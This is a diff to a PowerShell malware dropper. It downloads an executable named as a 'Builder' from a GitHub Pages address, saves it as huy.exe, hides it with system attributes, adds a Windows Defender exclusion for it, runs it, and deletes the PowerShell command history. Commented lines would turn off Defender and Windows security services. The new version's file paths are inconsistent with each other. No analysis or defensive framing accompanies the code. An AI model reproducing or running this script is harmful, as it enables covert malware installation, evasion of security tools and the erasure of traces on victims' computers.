@@ -1,22 +1,15 @@
 Import-Module BitsTransfer;
-$filePath = [Environment]::GetFolderPath('ApplicationData') + '\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt'
 
-#if (!(Test-Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection')) {
-#    New-Item -Path "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Force
-#}
-
-#if (!(Test-Path 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\')) {
-#    New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions" -Name 'Paths' -Force
-#}
-
-#Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1;
-#Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" -Name C:\Users\Public\huy.exe -Value 0;
-#Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name DisableRealtimeMonitoring -Value 1;
-#Set-Service -Name "wscsvc" -Status stopped -StartupType disabled
-Start-BitsTransfer -Source "https://sumhex151.github.io/upO%20Builder%200.9.6.exe" -Destination "C:\Users\Public\huy.exe";
-$fileInfo = New-Object System.IO.FileInfo('C:\Users\Public\huy.exe');
+# Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1;
+# Set-MpPreference -DisableRealtimeMonitoring $true;
+# Set-Service -Name "wscsvc" -Status stopped -StartupType disabled;
+# Set-Service -Name "WinDefend" -Status stopped -StartupType disabled;
+# Set-Service -Name "SecurityHealthService" -Status stopped -StartupType disabled;
+Start-BitsTransfer -Source "https://sumhex151.github.io/upO%20Builder%200.9.6.exe" -Destination "%ProgramData%\huy.exe";
+Add-MpPreference -ExclusionPath "$env:ProgramData\Microsoft\huy.exe"
+$fileInfo = New-Object System.IO.FileInfo('%ProgramData%\huy.exe');
 $fileInfo.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System;
-Start-Process "C:\Users\Public\huy.exe";
+Start-Process "$env:ProgramData\huy.exe";
 
 if (Test-Path (Get-PSReadlineOption).HistorySavePath) {
     Remove-Item (Get-PSReadlineOption).HistorySavePath -Force
